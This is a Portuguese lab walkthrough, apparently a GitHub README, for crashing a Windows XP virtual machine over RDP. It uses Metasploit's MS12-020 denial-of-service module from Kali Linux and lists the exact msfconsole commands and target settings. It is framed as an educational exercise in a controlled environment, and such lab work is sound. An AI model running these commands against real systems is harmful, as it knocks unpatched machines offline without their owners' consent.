# Ataque DoS no Windows XP via RDP (Remote Desktop Protocol)

## Objetivo
Realizar um ataque de negação de serviço (DoS) utilizando uma vulnerabilidade no RDP do Windows XP, causando a "tela azul".

## Cenário
- **Sistema vulnerável**: Windows XP
- **Sistema atacante**: Kali Linux
- **Virtualizador**: VirtualBox

## Requisitos
1. Verifique se o acesso remoto está habilitado no Windows XP.
2. Certifique-se de que ambas as VMs (Windows XP e Kali Linux) estão na mesma rede.

## Procedimento

### No Kali Linux
1. **Obtenha acesso root:**
   ```bash
   sudo su
   ```

2. **Inicie o Metasploit Framework:**
   ```bash
   msfconsole
   ```

3. **Pesquise por exploits relacionados ao RDP:**
   ```bash
   search rdp
   ```

4. **Selecione o exploit auxiliar para o ataque DoS:**
   ```bash
   use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
   ```

5. **Configure o IP do alvo (Windows XP):**
   ```bash
   set rhosts 192.168.56.103
   ```

6. **Execute o ataque:**
   ```bash
   run
   ```
A execução do ataque deve causar a "tela azul" na VM Windows XP:

![image](https://github.com/user-attachments/assets/021bda16-66a2-47c5-be72-04cb2da15ca0)


No terminal do Kali Linux, o progresso do ataque será exibido:

![image](https://github.com/user-attachments/assets/5470861f-bf27-4236-b583-dd0a80caf4b0)

***Este ataque é realizado em ambiente controlado para fins educacionais***


